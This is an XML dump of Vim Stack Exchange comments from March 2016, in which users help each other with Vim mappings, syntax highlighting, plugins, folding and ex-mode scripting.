  <row Id="11122" PostId="6858" Score="3" Text="Or perhaps there already *is* a gvimrc file that overrides this (this file is only loaded when using Gvim). Otherwise you can try following [the steps here](http://vi.stackexchange.com/q/2003/51) and/or posting your full vimrc file" CreationDate="2016-03-13T12:04:44.140" UserId="51" />
  <row Id="11123" PostId="6853" Score="1" Text="I used the space for firing it. my nvim config: https://github.com/toogley/dotfiles/tree/593f8f89b2e1633a27e9d501a3a639cb4f34380b/nvim" CreationDate="2016-03-13T15:20:25.090" UserId="2354" />
  <row Id="11124" PostId="6870" Score="1" Text="I cannot reproduce this. Can you try with `vim -Nu NONE`?" CreationDate="2016-03-13T18:53:48.440" UserId="205" />
  <row Id="11125" PostId="6869" Score="0" Text="For the second issue, maybe `:h type()` could help." CreationDate="2016-03-13T19:07:59.970" UserId="1800" />
  <row Id="11126" PostId="6870" Score="0" Text="@muru it works when i start `vim -Nu NONE` and manually define the mapping." CreationDate="2016-03-13T19:08:43.080" UserId="2354" />
  <row Id="11128" PostId="6870" Score="0" Text="Try disabling your plugins, etc." CreationDate="2016-03-13T19:25:00.640" UserId="205" />
  <row Id="11129" PostId="6869" Score="0" Text="@muru The intention was the ability to access the `root` value of any nested dictionary without the need for an extra container, so that there is less typing. I wanted to be sure that there is no special method that will return the data from the top of each dictionary entry. Like for example: `foo = {'_' : 'house', 'bar': 'apple'}` so that `foo` will return `house` and `foo.bar` will return `apple`" CreationDate="2016-03-13T19:30:23.520" UserId="5328" />
  <row Id="11130" PostId="6869" Score="0" Text="@symbolix keys are unordered. As far as Vim is concerned, `bar` is just as likely to be the top as `_`." CreationDate="2016-03-13T19:31:52.597" UserId="205" />
  <row Id="11131" PostId="6871" Score="0" Text="Thank you very much, I will try that now." CreationDate="2016-03-13T19:32:29.600" UserId="5328" />
  <row Id="11132" PostId="6869" Score="0" Text="@muru Sure. By *top* I mean, like the root of each nest, like a secret key that would act as the first element, without the need for an extra storage string. But, you have already answered my question, there are no default (reserved) methods for the dictionaries. Like in the example above, you would have a `'_'` key with the `house` value in there but you would not need to type `foo._` to access the `house` but only `foo` will be enough." CreationDate="2016-03-13T19:37:36.880" UserId="5328" />
  <row Id="11133" PostId="6869" Score="0" Text="If you want, you can define a function for each dict that returns a given value, so you'd call `foo.P()` instead of `foo.path`." CreationDate="2016-03-13T19:39:20.883" UserId="205" />
  <row Id="11134" PostId="6868" Score="0" Text="I have my custom fonts (not devicons in particular) in `~/.fonts/` on Ubuntu 15.10. Perhaps try putting them there? I know the default path changed at some point from my Arch Linux days, but I don't know which paths Ubuntu 15.10 accepts (perhaps both?) It's worth a try anyway ;-)" CreationDate="2016-03-13T19:40:07.140" UserId="51" />
  <row Id="11135" PostId="6870" Score="2" Text="You can try [following the steps outline here](http://vi.stackexchange.com/q/2003/51) to isolate the problem ;-)" CreationDate="2016-03-13T19:42:01.127" UserId="51" />
  <row Id="11136" PostId="6866" Score="1" Text="In general, you *don't* want to type comments after abbreviations like this. Sooner or later, it *will* be interpreted as the right-hand side of an abbreviation since `&quot;` is also used to quote strings. You're best off just giving comments their own line to sit on ;-)" CreationDate="2016-03-13T19:43:30.937" UserId="51" />
  <row Id="11137" PostId="6869" Score="0" Text="Yes. Thank you very much. I was trying to avoid that. However, now it looks like this is unavoidable since I need a function for the iteration (recursion) etc. I will implement a function for that." CreationDate="2016-03-13T19:44:07.660" UserId="5328" />
  <row Id="11138" PostId="6867" Score="1" Text="Does this file already have some other syntax highlighting applied to it?" CreationDate="2016-03-13T20:05:17.970" UserId="51" />
  <row Id="11140" PostId="6872" Score="0" Text="@Lawrence Changing the gettext files would not strictly be &quot;recompiling&quot; ;-) And because the default of `en` doesn't seem to have an existing `.po`/`.mo` file, the changes could actually stick between upgrades ... But no, it's not simply a setting or some such..." CreationDate="2016-03-13T21:07:15.497" UserId="51" />
  <row Id="11141" PostId="6872" Score="0" Text="Thanks. I meant change it globally always. Don't know what a gettext po file is, but I am now content that this is not easy enough to be worth doing (for me; maybe it _is_ easy). (deleted above and edited)" CreationDate="2016-03-13T21:08:11.967" UserId="4505" />
  <row Id="11142" PostId="6865" Score="1" Text="Note that the contents of `statusline` will be evaluated on every screen update. That's *a lot*. This simple expression is not a problem, but more complicated ones might be (like, say, getting the `git` branch name, the date, or some other relatively expansive operation)." CreationDate="2016-03-13T21:10:15.810" UserId="51" />
  <row Id="11143" PostId="6872" Score="0" Text="@Lawrence Not entirely sure how to go about it either; I just know it can be done :-) IMHO this is is too small of an issue for me to spend a lot of time on ;-)" CreationDate="2016-03-13T21:34:44.157" UserId="51" />
  <row Id="11144" PostId="6861" Score="1" Text="You could perhaps simplify the macro by deleting the empty lines before starting it: `:g/^$/d`, or something similar." CreationDate="2016-03-14T00:02:25.317" UserId="205" />
  <row Id="11145" PostId="6867" Score="0" Text="Yes, it is a perl test file. Perl syntax highlighted." CreationDate="2016-03-14T02:19:32.467" UserId="6568" />
  <row Id="11147" PostId="6867" Score="0" Text="Right, so you want to highlight Perl code inside Perl code *[insert snarky comment about Perl readability]* :p" CreationDate="2016-03-14T02:20:30.447" UserId="51" />
  <row Id="11157" PostId="6379" Score="0" Text="I think you mean [Ultisnips](http://www.vim.org/scripts/script.php?script_id=2715), rather than Ultsnippets" CreationDate="2016-03-14T03:50:13.320" UserId="1708" />
  <row Id="11158" PostId="6859" Score="2" Text="Relevant: http://stackoverflow.com/questions/10760326/merge-multiple-lines-two-blocks-in-vim" CreationDate="2016-03-14T04:41:24.040" UserId="46" />
  <row Id="11160" PostId="6879" Score="0" Text="I see some support for C++14 was added in v7.4.923 (binary literals). But not the number separator it seems :-/ The latest C++ files [from here](https://github.com/vim-jp/vim-cpp) also doesn't seem to have it yet." CreationDate="2016-03-14T06:17:35.140" UserId="51" />
  <row Id="11161" PostId="6879" Score="4" Text="For a quick fix, you can probably add `syn match   cNumber     display contained &quot;\d\(\d\|'\)*\(u\=l\{0,2}\|ll\=u\)\&gt;&quot;` to `~/.vim/syntax/cpp.vim`. (Btw, if that's C++, use `cstdlib`, *not* `stdlib.h`.)" CreationDate="2016-03-14T06:19:40.887" UserId="205" />
  <row Id="11162" PostId="6879" Score="3" Text="I just noticed there's an [open issue](https://github.com/vim-jp/vim-cpp/issues/23) since May 2014 btw." CreationDate="2016-03-14T06:20:57.780" UserId="51" />
  <row Id="11163" PostId="6879" Score="0" Text="@muru That seems to have fixed the problem. I'm fine with using a quick hack for now. Thanks!" CreationDate="2016-03-14T06:30:34.653" UserId="6807" />
  <row Id="11164" PostId="6879" Score="0" Text="@muru That sound like an answer...? ;-)" CreationDate="2016-03-14T07:36:51.690" UserId="51" />
  <row Id="11165" PostId="6879" Score="2" Text="@Carpetsmoker I am not to sure of syntax matching to know exactly what my change does. I think it will just match a digit followed any number of digits or single quotes, plus the `ull` fluff, but I don't know if it will match some invalid case. And apparently C++14 allows the separator in octal, binary, hex literals and floats and after the decimal point in floats. That's a *lot* more than I'm willing to take on." CreationDate="2016-03-14T07:46:35.937" UserId="205" />
  <row Id="11166" PostId="6822" Score="0" Text="Adding the remapping the combined versions like 'nnoremap tö t]' is the best solution for me, Thanks." CreationDate="2016-03-14T08:11:06.060" UserId="6710" />
  <row Id="11167" PostId="6883" Score="0" Text="Oh, ok, I understand." CreationDate="2016-03-14T14:18:21.077" UserId="985" />
  <row Id="11168" PostId="6867" Score="0" Text="Typically the heredoc would be formatted as a string. For this particular file, I want to format it as perl. I've seen similar configurations, i.e. javascript inside an &lt;script&gt; tag in an HTML file." CreationDate="2016-03-14T15:28:34.707" UserId="6568" />
  <row Id="11169" PostId="6784" Score="0" Text="@Carpetsmoker *BSDs are phasing out procfs." CreationDate="2016-03-14T15:46:09.430" UserId="2313" />
  <row Id="11170" PostId="6884" Score="0" Text="I've never used the plugin but the readme page says `Start Vdebug with &lt;F5&gt;, which will make it wait for an incoming connection. Run the script you want to debug, with the debugging engine enabled. A new tab will open with the debugging interface.` you didn't mention starting the script you want to debug in your post so just to be sure: do you start the script to start the debugging? Also (probably) not related to your problem but you should keep only your plugin installation/customization between `call plug#begin('~/.vim/plugged')` and `call plug#end()`." CreationDate="2016-03-14T16:53:35.893" UserId="1841" />
  <row Id="11171" PostId="6884" Score="0" Text="Thanks for the tip on the begin/end tags. Just to be clear: I have opened a `.php` file in vim, and on a non-blank line in this file, I press &lt;kbd&gt;F5&lt;/kbd&gt;. Then nothing happens. It should start a Vdebug session. I have also started the script with Xdebug enabled, but still nothing happens." CreationDate="2016-03-14T20:16:02.303" UserId="6514" />
  <row Id="11172" PostId="6884" Score="0" Text="I started my vim with your `.vimrc`, installed your plugins excepted youCompleteMe which poped an error, edited a php file and pressed F5 and I got the message `Waiting for connection (Ctrl-C to cancel etc...)`. So I would be surprised but maybe youCompleteMe creates a conflict and you should try after disabling it otherwise as I can't reproduce your problem I don't know how to help you :-/ good luck :-)" CreationDate="2016-03-14T20:39:54.450" UserId="1841" />
  <row Id="11173" PostId="6879" Score="0" Text="@Carpetsmoker I've been using the fix since yesterday and it doesn't seem to be causing any issues so this answer works for me. I'll accept once you post it." CreationDate="2016-03-14T21:34:42.203" UserId="6807" />
  <row Id="11174" PostId="6884" Score="0" Text="I have tried that as per your suggestion, but it does not work... Very strange. Which terminal emulator are you using? Maybe something is wrong with the keycode it receives. I am using xfce4-terminal. thanks for your help! :)" CreationDate="2016-03-14T21:39:52.977" UserId="6514" />
  <row Id="11175" PostId="6884" Score="0" Text="Indeed good think to check I'm using rxvt-unicode on a Debian Jessie with gnome3." CreationDate="2016-03-14T21:46:06.227" UserId="1841" />
  <row Id="11180" PostId="6885" Score="1" Text="I think you can lose the first two lines here (`runtime! syntax/sql.vim`, `unlet b:current_syntax`)? As you're not doing anything with the SQL syntax..." CreationDate="2016-03-14T23:25:02.920" UserId="51" />
  <row Id="11184" PostId="6876" Score="0" Text="Comments are not for extended discussion; this conversation has been [moved to chat](http://chat.stackexchange.com/rooms/36986/discussion-on-question-by-muru-can-i-apply-one-files-filetype-to-another-witho)." CreationDate="2016-03-14T23:34:10.497" UserId="205" />
  <row Id="11185" PostId="4847" Score="1" Text="Note that `export` is a *command*, so the rest of the line is a shell word, NOT an assignment.  Therefore unlike with a variable assignment (that doesn't use `export`), [you need double quotes or it will break on whitespace](http://unix.stackexchange.com/a/25704/135943).  Also see [How to correctly add a path to PATH](http://unix.stackexchange.com/a/26059/135943)." CreationDate="2016-03-14T23:42:09.150" UserId="4676" />
  <row Id="11186" PostId="6876" Score="0" Text="Tim Pope's [vim-eunuch](https://github.com/tpope/vim-eunuch) advertises filetype detection based on the original filename. Didn't look how it handles it, and I don't know if it was already mentioned in your other thread." CreationDate="2016-03-14T23:55:15.793" UserId="1800" />
  <row Id="11187" PostId="6876" Score="1" Text="@VanLaser no, it hasn't been mentioned yet, and I think it might be the answer to a third question as well: http://vi.stackexchange.com/q/258/205" CreationDate="2016-03-15T00:02:19.383" UserId="205" />
  <row Id="11189" PostId="451" Score="0" Text="So, would it actually get triggered by pressing the same key 42 times?" CreationDate="2016-03-15T02:50:43.843" UserId="4676" />
  <row Id="11191" PostId="6887" Score="0" Text="Where does your PDF viewer show them as being located?" CreationDate="2016-03-15T06:26:46.093" UserId="205" />
  <row Id="11192" PostId="6728" Score="0" Text="Sorry for this late reply, but just wanted to let you know that in the meantime I've had to reinstall Kubuntu (for reasons unrelated to the above issue) and in this completely fresh install of Kubuntu/konsole/vim the syntax highlighting works perfect. So the problem is solved, but I don't know what caused it in the first place, and unfortunately I can't let you know if your suggestion would have worked..." CreationDate="2016-03-15T06:46:24.277" UserId="4446" />
  <row Id="11193" PostId="6887" Score="1" Text="The `printexpr` setting should be used for this; so using `:set printexpr?` might yield some useful information?" CreationDate="2016-03-15T06:47:22.557" UserId="51" />
  <row Id="11194" PostId="6887" Score="0" Text="@Carpetsmoker, I updated the question with the answers to your and muru's questions." CreationDate="2016-03-15T08:34:41.973" UserId="4676" />
  <row Id="11195" PostId="451" Score="0" Text="@Wildcard No, there are no references to this in the Vim source outside of the documentation files." CreationDate="2016-03-15T08:35:45.813" UserId="51" />
  <row Id="11198" PostId="6888" Score="1" Text="You could have found it by dragging the icon in the title bar to a terminal window." CreationDate="2016-03-15T08:44:36.090" UserId="54" />
  <row Id="11199" PostId="6888" Score="0" Text="@romainl, indeed!  Usually right click on the icon will show the parent directories, but not in this case.  Dragging did the trick and is much faster than `lsof`; thanks!" CreationDate="2016-03-15T08:50:54.483" UserId="4676" />
  <row Id="11200" PostId="258" Score="0" Text="Set a cookie (some `b:` variable with an unique name) from a `BufNewFile`, check for the same cookie from a `BufWritePost`, then delete it after you write the file." CreationDate="2016-03-15T10:46:30.750" UserId="1577" />
  <row Id="11201" PostId="258" Score="0" Text="@lcd047 that's what Dhruva's method does (`b:is_new` in his case)." CreationDate="2016-03-15T10:47:34.627" UserId="205" />
  <row Id="11202" PostId="258" Score="0" Text="Nope, that has two drawbacks: (1) `BufWritePre` stats the file before every write; `BufNewFile` is run only once; and (2) it `chmod`s the file multiple times if you write the file multiple times in the same session (that is, it doesn't `unlet` the cookie)." CreationDate="2016-03-15T10:50:40.033" UserId="1577" />
  <row Id="11203" PostId="258" Score="0" Text="@lcd047 Hmm, true. Want to post an answer or edit that post?" CreationDate="2016-03-15T10:52:43.023" UserId="205" />
  <row Id="11204" PostId="258" Score="0" Text="I'm afraid I no longer thread in these waters nowadays, just making guest appearances every now and then. :)" CreationDate="2016-03-15T10:54:58.817" UserId="1577" />
  <row Id="11205" PostId="258" Score="0" Text="@lcd047 you worried about the license changes too?" CreationDate="2016-03-15T10:55:45.557" UserId="205" />
  <row Id="11206" PostId="258" Score="0" Text="Right now I have a pretty interesting research project that takes most of my time.  But yes, I also happen to disagree with the licence change." CreationDate="2016-03-15T11:38:55.620" UserId="1577" />
  <row Id="11207" PostId="6885" Score="0" Text="Thanks. That should have been `runtime! syntax/perl.vim` instead of `runtime! syntax/sql.vim`. That probably isn't necessary either since the rest of the file is using the perl syntax." CreationDate="2016-03-15T12:51:12.120" UserId="6568" />
  <row Id="11208" PostId="6891" Score="0" Text="Awesome!  That's perfect!  So then for my use case, I guess that character should be right before the `#` at the start of the header lines...any idea if that will screw up markdown renderers?" CreationDate="2016-03-15T13:15:36.933" UserId="4676" />
  <row Id="11209" PostId="6891" Score="0" Text="It does screw up the rendering, but by putting it on its own line just before, all is well.  Except it takes up extra page real estate, but oh well." CreationDate="2016-03-15T14:04:13.760" UserId="4676" />
  <row Id="11214" PostId="6893" Score="0" Text="For the line break at the 80 column you could look at `textwidth` option see `:h :tw`." CreationDate="2016-03-15T18:50:48.673" UserId="1453" />
  <row Id="11215" PostId="6728" Score="0" Text="@LB7979 Ok, no problem. Good luck :)." CreationDate="2016-03-15T18:51:39.367" UserId="5232" />
  <row Id="11216" PostId="6893" Score="0" Text="You could also put two spaces after full-stops, and `set cpo+=J`. This will allow you to jump between sentences with `(` and `)`, ignoring abbreviation dots." CreationDate="2016-03-15T20:15:52.227" UserId="4505" />
  <row Id="11217" PostId="4847" Score="1" Text="I found the actual link I was looking for yesterday (although the above links are good also).  [Are quotes needed for local variable assignment?](http://unix.stackexchange.com/a/97569/135943)" CreationDate="2016-03-15T22:41:01.503" UserId="4676" />
  <row Id="11218" PostId="1921" Score="1" Text="Note that this command will complain if you have any empty lines at the end of your file." CreationDate="2016-03-15T22:45:26.723" UserId="4676" />
  <row Id="11219" PostId="6595" Score="0" Text="Perfect! That's exactly what I was looking for (especially the second example). Shame that these preferences are not set using vim options themselves, but via Mac system defaults instead, but this still seems to work fairly robustly. Thanks!" CreationDate="2016-03-15T23:14:33.733" UserId="91" />
  <row Id="11220" PostId="6892" Score="0" Text="There's [vim-matlab](https://github.com/daeyun/vim-matlab)... I have no idea how well it works... But you can try it :-)" CreationDate="2016-03-16T02:56:47.490" UserId="51" />
  <row Id="11222" PostId="6894" Score="3" Text="First, you can see what script/plugin sets a map with this command: `:verbose map &lt;F2&gt;`. Also, if you use vim in terminal, maybe F2 is seen as a succession of other keys instead. For example, if I do a `Ctrl-V` `F2` in insert mode in Vim, i get the codes for `Ctrl-[` `OQ` (i.e. `Esc O Q`). Maybe something like that is tickling your Ultisnips." CreationDate="2016-03-16T10:04:06.843" UserId="1800" />
  <row Id="11223" PostId="6893" Score="0" Text="I think you'll have to use `set textwidth=80` to cut your lines when they are longer than 80 characters and then use `formatexpr` ([`:h 'formatexpr'`](http://vimdoc.sourceforge.net/htmldoc/options.html#%27formatexpr%27)) which allows to set create a function handling the behavior to follow when a line is wrapped. If you create a function which add two whitespaces to the wrapped line you should be able to do what you want. (I'll try to work on it later today and I'll post something if I get something interesting)" CreationDate="2016-03-16T12:38:29.103" UserId="1841" />
  <row Id="11224" PostId="6897" Score="0" Text="thanks for your edit" CreationDate="2016-03-16T12:40:09.693" UserId="6600" />
  <row Id="11225" PostId="4447" Score="0" Text="Not sure if I understand what the problem is exactly? Statox's answer seems to be a solution; specifically, setting the `directory` and `backupdir` so that Vim stores all those files in `~/.vim/tmp` or some such ... Didn't this work for you? Is this not an option?" CreationDate="2016-03-16T18:38:26.910" UserId="51" />
  <row Id="11226" PostId="6898" Score="2" Text="You could try the [vis](http://www.drchip.org/astronaut/vim/#VIS) plugin from Dr. Chip or my [NrrwRgn](https://github.com/chrisbra/NrrwRgn) plugin. Both should handle it just fine." CreationDate="2016-03-16T18:45:01.277" UserId="71" />
  <row Id="11227" PostId="6772" Score="0" Text="any progress how to load the dll's? I am facing the exact same issue currently" CreationDate="2016-03-16T19:05:08.193" UserId="6842" />
  <row Id="11228" PostId="6874" Score="0" Text="You could use `gJ` instead of `J` to prevent Vim from inserting spaces." CreationDate="2016-03-17T02:12:59.340" UserId="6698" />
  <row Id="11230" PostId="6900" Score="0" Text="Why did you create that mapping when you already have right  `&lt;right&gt;`?" CreationDate="2016-03-17T06:10:57.120" UserId="54" />
  <row Id="11231" PostId="6900" Score="1" Text="That works, thanks.  If you post it as an answer I'll accept." CreationDate="2016-03-17T06:13:02.460" UserId="5373" />
  <row Id="11233" PostId="6901" Score="1" Text="Interesting that the reverse case of automatically exiting if a pattern *is* found can be easily accomplished with e.g. `ex -sc 'g/exit_pattern/q!' -c '%s/change/stuff/g | x' file`, but this method doesn't adapt at all to my question as it actually operates line by line." CreationDate="2016-03-17T09:54:23.587" UserId="4676" />
  <row Id="11234" PostId="6901" Score="1" Text="I don't know if it will help, but you could make the substitution, check if the buffer is modified, if it is undo and make a backup, then redo the substitution. It would give something like: `vim -c '%s/pattern/replace/ge | exe &amp;modified == 1 ? &quot;undo | w %.bup | redo | write | exit&quot; : &quot;exit&quot;' file`" CreationDate="2016-03-17T10:19:00.763" UserId="4939" />
  <row Id="11235" PostId="6901" Score="0" Text="It's fairly close, except for being not POSIX.  Would you mind [adding it as an answer?](http://meta.unix.stackexchange.com/a/3927/135943)  ;)" CreationDate="2016-03-17T10:22:12.750" UserId="4676" />
  <row Id="11236" PostId="3276" Score="1" Text="`ex` mode is really only intended to work with lines.  The whole concept of &quot;line-wise&quot; vs. &quot;character-wise&quot; was entirely new in `vi`; before that (in `ex`) *everything* was line-wise." CreationDate="2016-03-17T10:24:27.190" UserId="4676" />
  <row Id="11237" PostId="6902" Score="0" Text="I didn't realize that the `:w` command would be correctly terminated by a `|`—I was thinking of `sed`, wherein a `w` command can't be terminated by a `;` but only by a newline.  And this is still helpful even though not POSIX; thanks!" CreationDate="2016-03-17T10:36:51.563" UserId="4676" />
  <row Id="11238" PostId="6902" Score="1" Text="(Given that you use `vim` as the command rather than `ex` or `vi`, it's rather self-protecting against POSIX incompatibility.  If the user doesn't have `vim` but only some minimal POSIX implementation, the `vim` command won't even be found and they'll get an error at the shell level.)" CreationDate="2016-03-17T10:37:52.423" UserId="4676" />
  <row Id="11239" PostId="6903" Score="2" Text="Two very related questions: [Including dictionary terms with spaces](http://vi.stackexchange.com/q/2068/51) and [Ins-completion of WORDs](http://vi.stackexchange.com/q/1871/51); duplicate probably?" CreationDate="2016-03-17T11:01:03.710" UserId="51" />
  <row Id="11240" PostId="6903" Score="4" Text="I could also suggest continuing with `Ctrl-x Ctrl-n` as many times as needed, after the 1st `Ctrl-n` completion." CreationDate="2016-03-17T11:02:41.620" UserId="1800" />
  <row Id="11241" PostId="4447" Score="0" Text="The Statox's solution not  worked, still leave temporary files over webdav, if set directory=~/tmp and set backupdir=~/tmp in .vimrc still got one empty file over webdav" CreationDate="2016-03-17T12:01:33.567" UserId="3271" />
  <row Id="11242" PostId="6903" Score="0" Text="Thanks! I think I'll go for abbreviations for commonly inserted text as I do not want to change iskeyword variable, and use c-x c-n for one time completion." CreationDate="2016-03-17T12:17:44.533" UserId="6848" />
  <row Id="11244" PostId="6908" Score="4" Text="Use `R` to overwrite text? (and possibly add some spaces)" CreationDate="2016-03-17T15:41:05.993" UserId="1800" />
  <row Id="11245" PostId="6908" Score="0" Text="That's the closest I've found, seems clumsy though. Maybe I have too much faith in vim :-)" CreationDate="2016-03-17T15:42:29.530" UserId="1033" />
  <row Id="11246" PostId="6908" Score="1" Text="There are text alignment plugins, you could use one of those to re-align columns after an edit (e.g. &quot;EasyAlign&quot;)." CreationDate="2016-03-17T15:43:14.913" UserId="1800" />
  <row Id="11247" PostId="6908" Score="0" Text="I'm actually in [VsVim](https://github.com/jaredpar/VsVim/) which doesn't have plugins, I can switch out to full vim but it's a faff. [SpecFlow](http://www.specflow.org/) does actually re-align it all but I have to replace the last `|` to get it to fire." CreationDate="2016-03-17T15:47:27.937" UserId="1033" />
  <row Id="11248" PostId="6905" Score="0" Text="How did you manage to miss `&lt;C-w&gt;p` and `:wincmd p` when you read `:help window-move-cursor`?" CreationDate="2016-03-17T16:03:27.687" UserId="54" />
  <row Id="11249" PostId="6906" Score="1" Text="Do you want to fold *only* docstrings, or docstrings *in addition* to folding Python code?" CreationDate="2016-03-17T16:14:21.553" UserId="51" />
  <row Id="11250" PostId="6908" Score="0" Text="Oh. Consider writing a VsVim plugin then, if possible - you'll be the hero of many Visual users :)" CreationDate="2016-03-17T16:33:48.677" UserId="1800" />
  <row Id="11251" PostId="6908" Score="2" Text="If you are using VsVim you should put that in your question as there are significant differences between VsVim and Vim. If you where using Vim then I would suggest an alignment plugin like [EasyAlign](https://github.com/junegunn/vim-easy-align) or [Tabular](https://github.com/godlygeek/tabular). This can be improved upon this by using [cucumbertables](https://gist.github.com/tpope/287147) or [Vim Table Mode](https://github.com/dhruvasagar/vim-table-mode). As VanLaser suggested you can use `R`. Since SpeckFlow realigns on `|` can you do `cf|` and add your text?" CreationDate="2016-03-17T16:38:16.957" UserId="778" />
  <row Id="11252" PostId="6892" Score="0" Text="No, I'm not looking for a matlab cli. I know how to use it, for the most part, even in headless mode. I do prefer this to using the GUI, but some things are hard to get by in `-nodisplay` mode. I don't think there is a way to run a section of a script (a section devided by a `%%` comment, I mean), skip the second section and run the third section. Also (very strangely) I can't find a way to list the variables as it does in the GUI workspace. These, and a few other things (mostly regarding plots) keep me from using `-nodisplay` full time." CreationDate="2016-03-17T19:27:59.943" UserId="2082" />
  <row Id="11253" PostId="5049" Score="0" Text="After some months more experience, this is how I would resolve it today as well.  Shouldn't there be a width specifier on the second `%d`, though?  So that e.g. `11:09` won't be written as `11:9`?" CreationDate="2016-03-17T19:40:55.460" UserId="4676" />
  <row Id="11254" PostId="5049" Score="0" Text="@wildcard, thank you: you are absolutely right. (fixed)" CreationDate="2016-03-18T00:12:38.667" UserId="3002" />
  <row Id="11255" PostId="6719" Score="0" Text="Could you handle the rough edge by adding a `+` before the `?`  (Funny, I was thinking of `ex` mode, but I think this would work as well for normal mode." CreationDate="2016-03-18T01:43:00.300" UserId="4676" />
  <row Id="11256" PostId="6719" Score="0" Text="What is `&lt;Leader&gt;` exactly?  (I can post a new question if it's hard to explain.)" CreationDate="2016-03-18T01:43:21.723" UserId="4676" />
  <row Id="11257" PostId="6910" Score="0" Text="Well, thanks for trying to help, but I know about ys operator and vim text objects. What I didn't know is that I can press f to prompt to function name. Still, my proposed plugin is much better handles this task I believe.&#xA;Have you noticed, that even in this very simple case with surround I would need the press 6 keys? And with my plugin is only two. What's even more important is that it's less thought work. I don't need to think about what text-object I need to use." CreationDate="2016-03-18T07:53:49.870" UserId="6634" />
  <row Id="11258" PostId="6719" Score="0" Text="See `:h Leader`. It's a key (actually, a string, but everyone just uses one character) to be used for mappings just as above. If you did not set it yourself, it defaults to &quot;\&quot;, so `&lt;Leader&gt;f` is the same as `\f`. The distinct advantage of Leader over explicitly using a key is that everyone can just set the leader to what they find comfortable." CreationDate="2016-03-18T08:17:44.640" UserId="1296" />
  <row Id="11259" PostId="6909" Score="0" Text="Okay, why I need to do normap on ( in normal mode, If the plugin should work in insert mode?" CreationDate="2016-03-18T08:18:53.923" UserId="6634" />
  <row Id="11260" PostId="6909" Score="1" Text="Sorry it should be `nnoremap`, I fix the answer. Otherwise, I doubt you want to surround anything in insert mode when you just hit `(`. The default behaviour shall be to insert at least the opening bracket, and maybe the closing one. It the plugin waits for another input just to know where the closing bracket shall go, you'll quickly grow tired with this behaviour." CreationDate="2016-03-18T09:44:04.157" UserId="626" />
  <row Id="11261" PostId="6910" Score="3" Text="When working every day with vim, learning to use the text-objects is not a waste of time." CreationDate="2016-03-18T09:45:27.430" UserId="626" />
  <row Id="11262" PostId="6915" Score="0" Text="I didn't test the function but I see `nmap s` and `nunmap s` it means that if I have `s` mapped I'll loose my mapping after executing the function, am I right? If I understood it correctly I think it would be interesting to save the mapping of use `80i` directly in the `execute` to avoid messing with the user configuration :-)" CreationDate="2016-03-18T09:52:18.167" UserId="1841" />
  <row Id="11263" PostId="6909" Score="0" Text="well of course it would insert opening paren, why wouldn't it?. And if you will press closing paren it would insert it as if nothing happened naturally. That's why if I would use imap ( to my plugin function I would insert ( first thing in this function. But I don't think that mapping paren in insert mode to something is would be good idea at all. Because that way other plugins probably wouldn't work properly. I wonder how delimitmate detects the presses of parens etc. I've tried to understand it, but couldn't." CreationDate="2016-03-18T10:15:25.697" UserId="6634" />
  <row Id="11264" PostId="6909" Score="0" Text="nnoremap wouldn't work in insert mode, right? If so, It's not what I wan't." CreationDate="2016-03-18T10:16:23.947" UserId="6634" />
  <row Id="11265" PostId="6909" Score="0" Text="oh, and of course plugin should be smart enough to know, that for example if there is nothing further in the current line, then it doesn't need to show anything at all and just close open param automatically or leave this work to delimitmate. It would be configurable." CreationDate="2016-03-18T10:18:03.183" UserId="6634" />
  <row Id="11266" PostId="6909" Score="0" Text="I'm maintaining and using [lh-brackets](https://github.com/LucHermitte/lh-brackets/&gt;) intensively. In insert mode, `(` is expanded to `()` + cursor move + placeholder only outside string and comment contexts. Any way, I don't have any side effect with other plugins (mostly the one I'm maintaining) having `(` mapped in insert mode." CreationDate="2016-03-18T10:30:15.197" UserId="626" />
  <row Id="11267" PostId="6909" Score="0" Text="nnoremap is restricted to normal mode, inoremap to insert mode, and xnoremap to visual mode. noremaps are triggered in normal, visual and select modes. vnoremap in visual and select modes. My advice, if you want to support several modes, then define several specialized mappings. It's the only way to know which is exactly the starting mode. Then, you could if you want offer a front-end to define all mappings in one line, that's what I do with `:Brackets` in lh-brackets." CreationDate="2016-03-18T10:32:43.990" UserId="626" />
  <row Id="11268" PostId="6909" Score="0" Text="So, if you want to to react to keys, enter a mode of yours, for insert/normal/visual/... mode with a mapping. Then, either listen to `feedkeys()` to do other things (see the brackets removal/modification feature in lh-brackets), or override all usual movements to do something related to the listening part, and when you are done, restore the movements previous behaviour (either with unmap, or by restoring a user defined mapping ; `lh#on#exit()` (from lh-vim-lib) will help on this topic, it can remember whether the thing to restore was mapped, and if yes, if it was a buffer local mapping)" CreationDate="2016-03-18T10:41:16.703" UserId="626" />
  <row Id="11269" PostId="6909" Score="0" Text="Thanks Luc! I'll try that way. What I actually think that there is a lot of plugins that provide similar functionality. How about we try to join our forces? I have a few other ideas about this stuff." CreationDate="2016-03-18T12:24:51.467" UserId="6634" />
  <row Id="11270" PostId="6909" Score="0" Text="Sorry, the thing is I already have to many on going things (refactoring plugin to refactor to use clang instead of ctags, the template/snippet plugin have a partially implemented (snippet-)inclusion feature, I want to rework the interface to the C++Class snippet to simplify the passing of parameters (attribute list, semantics, parents, ...), ...).&#xA;Beside, I would be tented to work on lh-brackets code base, and I suspect it would be best for your need to start from easymotions." CreationDate="2016-03-18T12:38:02.210" UserId="626" />
  <row Id="11271" PostId="6906" Score="0" Text="@Carpetsmoker, just docstrings. So far, I was unable to achive _reliable_ python folding similar to full-fledged IDEs." CreationDate="2016-03-18T12:49:10.663" UserId="6649" />
  <row Id="11272" PostId="6909" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/37169/discussion-between-user1685095-and-luc-hermitte)." CreationDate="2016-03-18T12:51:30.007" UserId="6634" />
  <row Id="11273" PostId="6921" Score="1" Text="Probably not the solution but to avoid some unexpected side effects in your mappings you should use `inoremap ii &lt;Esc&gt;`. I don't think that will solve your problem but that's still a best practice. Also could you please post your complete `.vimrc`: that could help us to help you ;-)" CreationDate="2016-03-18T13:20:42.417" UserId="1841" />
  <row Id="11274" PostId="6921" Score="0" Text="@statox, Changed to `inoremap`, same effect. Added link to the vimrc. Thanks :]" CreationDate="2016-03-18T13:29:58.277" UserId="6649" />
  <row Id="11275" PostId="6908" Score="0" Text="Thanks, I'll try out cucumbertables, looks good. I didn't mention it as I'm also interested in the pure vim answer ;-)" CreationDate="2016-03-18T14:00:09.877" UserId="1033" />
  <row Id="11276" PostId="6922" Score="0" Text="If you want to keep inline comments, you'll need a bar: ```imap jj &lt;ESC&gt;|                      &quot; Easy escape```" CreationDate="2016-03-18T14:12:26.647" UserId="4932" />
